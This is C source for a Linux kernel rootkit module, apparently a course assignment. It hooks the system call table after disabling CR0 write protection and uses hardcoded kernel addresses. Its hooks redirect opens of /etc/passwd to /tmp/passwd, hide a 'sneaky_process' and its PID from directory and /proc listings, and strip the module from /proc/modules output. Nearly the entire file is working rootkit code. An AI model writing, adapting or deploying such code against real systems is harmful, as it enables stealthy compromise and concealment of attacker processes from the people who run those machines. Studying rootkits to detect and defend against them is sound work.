#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

#include <linux/uaccess.h>     // for copy_to_user
// #include <asm/uaccess.h>
#include <linux/file.h>        // for absolute path

// Macros for kernel functions to alter Control Register 0 (CR0)
// This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
// Bit 0 is the WP-bit (write protection). We want to flip this to 0
// so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

// was asked to put at the front of this file
#define BUFFLEN 1024
#define PID_LEN 32

MODULE_LICENSE("GPL");  // without it throws warning

struct linux_dirent {
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    char d_name[BUFFLEN];
};

int is_read_proc = 0;
int is_read_proc_modules = 0;  // 0: false, 1: true

// not sure permission is correct or not, just copied.
static long spid = 0;  // pid_t not defined
module_param(spid, long, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);  
MODULE_PARM_DESC(spid, "sneaky_process pid");

// These are function pointers to the system calls that change page
// permissions for the given address (page) to read-only or read-write.
// Grep for "set_pages_ro" and "set_pages_rw" in:
//       /boot/System.map-`$(uname -r)`
//       e.g. /boot/System.map-4.4.0-145-generic
// CHANGED: to match the requirements.
// use 'sudo cat /boot/System.map-*-*-generic | grep -e set_pages_rw -e set_pages_ro -e sys_call_table'
// to see the addresses
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;

// This is a pointer to the system call table in memory
// Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
// We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;

// Function pointer will be used to save address of original 'open' syscall.
// The asmlinkage keyword is a GCC #define that indicates this function
// should expect ti find its arguments on the stack (not in registers).
// This is used for all system calls.

// CHANGED: to match the requirements.
asmlinkage int (*original_open)(const char *pathname, int flags, mode_t mode);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);

asmlinkage int (*original_close)(int fd);

// Define our new sneaky version of the 'open' syscall
// add mode to mitigate tab auto-complete temp file problem
asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode) {
    // if the user want to open '/etc/passwd', open '/tmp/passwd' instead.
    const char *tmp_path = "/tmp/passwd";
    const char *etc_path = "/etc/passwd";
    const char *pwd_name = "passwd";
    int retval;
    unsigned long status;

    char *path = NULL;  // get absolute path
    struct file *f = NULL;  // kernel file pointer for absolute path
    if (strcmp(pathname, etc_path) == 0) {
        // https://www.kernel.org/doc/htmldocs/kernel-api/API---copy-to-user.html
        status = copy_to_user((void *)pathname, tmp_path, strlen(tmp_path));  // (void __user *)
        printk(KERN_INFO "%ld is the status code\n", status);
        // in official doc on kernel.org, the return value is no compatible with
        // this copy_to_user function. more to cover in my blog post.
        
        // if (status != 0) {
        //     // never happens
        //     printk(KERN_INFO "Error! copy pathname failed 1.\n");
        //     printk(KERN_INFO "%d bytes not copied\n", status);
        //     // printk(KERN_INFO "path: %x, tmp: %x \n", pathname, tmp_path);
        //     // printk(KERN_INFO "path: %s, tmp: %s \n", pathname, tmp_path);
        //     printk(KERN_INFO "%d sizeof pathname ptr\n", (int)sizeof(pathname));
        //     printk(KERN_INFO "%d sizeof tmp path ptr\n", (int)sizeof(tmp_path));
        //     printk(KERN_INFO "%d str len\n", (int)strlen(tmp_path));
        //     return -1;  // cannot open errno
        // }
        retval = original_open(pathname, flags, mode);
        status = copy_to_user((void *)pathname, etc_path, strlen(etc_path));
        // if (status != 0) {
        //     // never happens
        //     printk(KERN_INFO "Error! copy pathname failed 2.\n");
        //     return -1;  // cannot open errno
        // }
        printk(KERN_INFO "KDEBUG passwd success.\n");
        return retval;
    }
    if (strcmp(pathname, pwd_name) == 0) {  // tricky, we need to see the full path
        // adapted from https://stackoverflow.com/questions/32175346/how-i-get-absolute-path-in-kernel-space-from-file-descriptor
        char *tmp = (char*)__get_free_page(GFP_TEMPORARY);
        retval = original_open(pathname, flags, mode);
        // struct file: https://elixir.bootlin.com/linux/latest/source/include/linux/file.h
        f = fget(retval);
        if (f == NULL) {
            free_page((unsigned long)tmp);
            return -1;
        }
        path = d_path(&f -> f_path, tmp, PAGE_SIZE);  // get absolute path from kernel file pointer
        if (IS_ERR(path)) {
            printk("KDEBUG error: absolute path\n");
            free_page((unsigned long)tmp);
            return -1;
        }
        printk("KDEBUG absolute path is: %s\n", path);
        free_page((unsigned long)tmp);
        return retval;
        // if (strcmp(path, etc_path) == 0) {
        //     int n = original_close(retval);  // close /etc/passwd
        //     if (n != -1) {
        //         status = copy_to_user((void *)&pathname, &tmp_path, strlen(tmp_path));
        //         retval = original_open(pathname, flags, mode);
        //         status = copy_to_user((void *)&pathname, &etc_path, strlen(etc_path));  // recover
        //         printk(KERN_INFO "KDEBUG passwd success. - in /etc\n");
        //         free_page((unsigned long)tmp);
        //         return retval;
        //     }
        //     else {
        //         // error occurred
        //         free_page((unsigned long)tmp);
        //         return -1;
        //     }
        // }
    }
    if (strcmp(pathname, "/proc/modules") == 0) {
        // if you open another file with 'sneaky_mod' in a line, it won't 
        // interfere with it. use global variable anyway.
        is_read_proc_modules = 1;
    }
    if (strcmp(pathname, "/proc") == 0) {
        is_read_proc = 1;
    }
    // also consider if proc opened
    return original_open(pathname, flags, mode);
}

// Define sneaky version of the 'getdents' syscall
asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    int l = original_getdents(fd, dirp, count);
    struct linux_dirent *my_dirent = dirp;
    int i = 0;
    char pid_str[PID_LEN];  // not sure if works in kernel space
    sprintf(pid_str, "%ld", spid);  // convert the pid to string
    while (i < l) {
        if ((strcmp(my_dirent -> d_name, "sneaky_process") == 0) || ((strcmp(my_dirent -> d_name, pid_str) == 0) && is_read_proc)) {
            char *next_dirent = (char*)my_dirent + my_dirent -> d_reclen;
            if (is_read_proc) {  // this is /proc/spid
                is_read_proc = 0;
            }
            // move all trailing entries to current ptr
            memmove(my_dirent, next_dirent, (size_t)dirp + l - (size_t)next_dirent);
            l -= my_dirent -> d_reclen;
            printk(KERN_INFO "KDEBUG getdents success.\n");
            break;  // no duplicate names allowed
        }
        i += my_dirent -> d_reclen;  // move ptr by the len of current entry
        my_dirent = (struct linux_dirent *) ((char *)dirp + i);  // move current ptr
    }
    return l;
}

// Define sneaky version of the 'read' syscall
asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
    // first, intercept the original 'read' syscall
    const char *sneaky_mod_name = "sneaky_mod";
    char *head = NULL;
    char *tail = NULL;
    char *buf_head = buf;
    ssize_t buf_len = original_read(fd, buf, count);
    if (buf_len <= 0) {
        // empty file or read error, no need to change
        return buf_len;
    }
    // second, remove the line that contains the 'sneaky_mod', and return
    // a correct buffer length
    // refer to 'cat /proc/modules' result
    
    // painful string manipulation with C/CPP TAT
    head = strstr(buf, sneaky_mod_name);
    if (head != NULL && is_read_proc_modules) {
        is_read_proc_modules = 0;
        tail = strstr(head, "\n");
        ++tail;  // now tail points to the char after '\n' for simplicity
        // use memmove to move all trailing chars to start, rather than loop
        memmove(head, tail, (buf_head + buf_len - tail));
        buf_len -= tail - head;  // minus by the length of the line
        printk(KERN_INFO "KDEBUG read success.\n");
        return buf_len; 
    }
    else {
        // sneaky_mod not found
        return buf_len;
    }
}

/* just as a viability test
static int initialize_sneaky_module(void) {
    printk(KERN_INFO "Sneaky module being loaded.\n");
    return 0;
}
*/

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
    struct page *page_ptr;

    // See /var/log/syslog for kernel print output
    printk(KERN_INFO "Sneaky module being loaded.\n");

    // Turn off write protection mode
    write_cr0(read_cr0() & (~0x10000));
    
    // Get a pointer to the virtual page containing the address
    // of the system call table in the kernel.
    page_ptr = virt_to_page(&sys_call_table);
    // Make this page read-write accessible
    pages_rw(page_ptr, 1);

    // CHANGED: to match the requirements.
    // This is the magic! Save away the original 'open' system call
    // function address. Then overwrite its address in the system call
    // table with the function address of our new code.

    original_open = (void*)*(sys_call_table + __NR_open);
    *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
    original_getdents = (void*)*(sys_call_table + __NR_getdents);
    *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
    original_read = (void*)*(sys_call_table + __NR_read);
    *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;

    // use close without unistd.h
    original_close = (void*)*(sys_call_table + __NR_close);
    
    // Revert page to read-only
    pages_ro(page_ptr, 1);

    // Turn write protection mode back on
    write_cr0(read_cr0() | 0x10000);

    return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) {
    struct page *page_ptr;

    printk(KERN_INFO "Sneaky module being unloaded.\n"); 

    // Turn off write protection mode
    write_cr0(read_cr0() & (~0x10000));

    // Get a pointer to the virtual page containing the address
    // of the system call table in the kernel.
    page_ptr = virt_to_page(&sys_call_table);
    // Make this page read-write accessible
    pages_rw(page_ptr, 1);

    // CHANGED: to match the requirements.
    // This is more magic! Restore the original 'open' system call
    // function address. Will look like malicious code was never there!
    *(sys_call_table + __NR_open) = (unsigned long)original_open;
    *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
    *(sys_call_table + __NR_read) = (unsigned long)original_read;

    // Revert page to read-only
    pages_ro(page_ptr, 1);
    // Turn write protection mode back on
    write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

